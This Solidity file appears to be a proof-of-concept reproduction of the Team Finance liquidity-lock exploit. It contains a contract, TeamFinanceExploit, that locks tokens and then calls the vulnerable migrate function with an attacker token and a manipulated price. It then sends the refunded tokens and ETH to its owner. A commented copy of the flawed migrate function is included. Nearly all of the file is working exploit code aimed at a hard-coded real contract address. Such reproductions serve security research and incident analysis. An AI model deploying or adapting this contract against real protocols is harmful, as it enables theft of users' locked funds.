// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";
import "./Interfaces.sol";

contract TeamFinanceExploit is Ownable {
    ILockToken constant lockTokenContract =
        ILockToken(0xE2fE530C047f2d85298b07D9333C05737f1435fB);
    // Team finance exploiter deployed this custom token
    //https://etherscan.io/tx/0xa3cbbdd2494f6d5452de8edc5c8c32f316abc40140a63769a22e04cd2549963b
    address constant attackerToken = 0x2d4ABfDcD1385951DF4317f9F3463fB11b9A31DF;
    uint160 constant sqrtPriceX96 = 74613657577043894100214078695625;

    function createLock(address _token, uint256 _amount)
        external
        payable
        onlyOwner
        returns (uint256 lockId)
    {
        IERC20(_token).transferFrom(msg.sender, address(this), _amount);
        IERC20(_token).approve(address(lockTokenContract), _amount);
        uint256 fees = lockTokenContract.getFeesInETH(_token);
        // Lock token with Team Finance
        lockId = lockTokenContract.lockToken{value: fees}(
            _token,
            address(this),
            _amount,
            block.timestamp + 1 days,
            false
        );
    }

    function exploit(
        address _uniV2PoolAddress,
        uint256 _lockId,
        bool _useAttackerToken
    ) external onlyOwner {
        IV3Migrator.MigrateParams memory params = IV3Migrator.MigrateParams({
            pair: _uniV2PoolAddress,
            liquidityToMigrate: IUniswapV2Pair(_uniV2PoolAddress).balanceOf(
                address(lockTokenContract)
            ),
            percentageToMigrate: 1, // Uniswap migrator contract requires minimum of 1 %
            token0: _useAttackerToken
                ? attackerToken
                : IUniswapV2Pair(_uniV2PoolAddress).token0(),
            token1: IUniswapV2Pair(_uniV2PoolAddress).token1(),
            fee: 500,
            tickLower: -100,
            tickUpper: 100,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp,
            refundAsETH: true
        });

        lockTokenContract.migrate(_lockId, params, true, sqrtPriceX96, false);
        IERC20(params.token0).transfer(
            owner(),
            IERC20(params.token0).balanceOf(address(this))
        );
        IERC20(params.token1).transfer(
            owner(),
            IERC20(params.token1).balanceOf(address(this))
        );
        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success);
    }

    // This is required for fallback
    receive() external payable {}
}

// Here is vulnerable function

/*
   function migrate(
        uint256 _id,
        IV3Migrator.MigrateParams calldata params,
        bool noLiquidity,
        uint160 sqrtPriceX96,
        bool _mintNFT
    )
    external
    payable
    whenNotPaused
    nonReentrant
    {
        require(address(nonfungiblePositionManager) != address(0), "NFT manager not set");
        require(address(v3Migrator) != address(0), "v3 migrator not set");
        Items memory lockedERC20 = lockedToken[_id];
        require(block.timestamp < lockedERC20.unlockTime, "Unlock time already reached");
        require(_msgSender() == lockedERC20.withdrawalAddress, "Unauthorised sender");
        require(!lockedERC20.withdrawn, "Already withdrawn");

        uint256 totalSupplyBeforeMigrate = nonfungiblePositionManager.totalSupply();
        
        //scope for solving stack too deep error
        {
            uint256 ethBalanceBefore = address(this).balance;
            uint256 token0BalanceBefore = IERC20(params.token0).balanceOf(address(this));
            uint256 token1BalanceBefore = IERC20(params.token1).balanceOf(address(this));
            
            //initialize the pool if not yet initialized
            if(noLiquidity) {
                v3Migrator.createAndInitializePoolIfNecessary(params.token0, params.token1, params.fee, sqrtPriceX96);
            }

            IERC20(params.pair).approve(address(v3Migrator), params.liquidityToMigrate);

            v3Migrator.migrate(params);

            //refund eth or tokens
            uint256 refundEth = address(this).balance - ethBalanceBefore;
            (bool refundSuccess,) = _msgSender().call.value(refundEth)("");
            require(refundSuccess, 'Refund ETH failed');

            uint256 token0BalanceAfter = IERC20(params.token0).balanceOf(address(this));
            uint256 refundToken0 = token0BalanceAfter - token0BalanceBefore;
            if( refundToken0 > 0 ) {
                require(IERC20(params.token0).transfer(_msgSender(), refundToken0));
            }

            uint256 token1BalanceAfter = IERC20(params.token1).balanceOf(address(this));
            uint256 refundToken1 = token1BalanceAfter - token1BalanceBefore;
            if( refundToken1 > 0 ) {
                require(IERC20(params.token1).transfer(_msgSender(), refundToken1));
            }
        }

        //remove old locked token details
        _removeERC20Deposit(_id);

        //Get the token id of newly generated nft for v3
        uint256 totalSupplyAfterMigrate = nonfungiblePositionManager.totalSupply();
        require(totalSupplyAfterMigrate == totalSupplyBeforeMigrate.add(1));
        uint256 tokenIndex = totalSupplyAfterMigrate.sub(1);
        uint256 tokenId = nonfungiblePositionManager.tokenByIndex(tokenIndex);

        //add new locked nft details ( received after migrating liquidity )
        uint256 newDepositId = ++depositId;
        _addNFTDeposit(_id, newDepositId, tokenId);

        listMigratedDepositIds[newDepositId] = _id;

        if (_mintNFT){
            require(NFT != address(0), 'NFT: Unintalized');
            nftMinted[newDepositId] = true;
        }

        if(nftMinted[_id])
        {
            nftMinted[_id] = false;
            IERC721Extended(NFT).burn(_id);
        }
        if (_mintNFT){
            IERC721Extended(NFT).mintLiquidityLockNFT(_msgSender(), newDepositId);
        }
        
        emit LiquidityMigrated(_msgSender(), _id, newDepositId, tokenId);
    }

*/
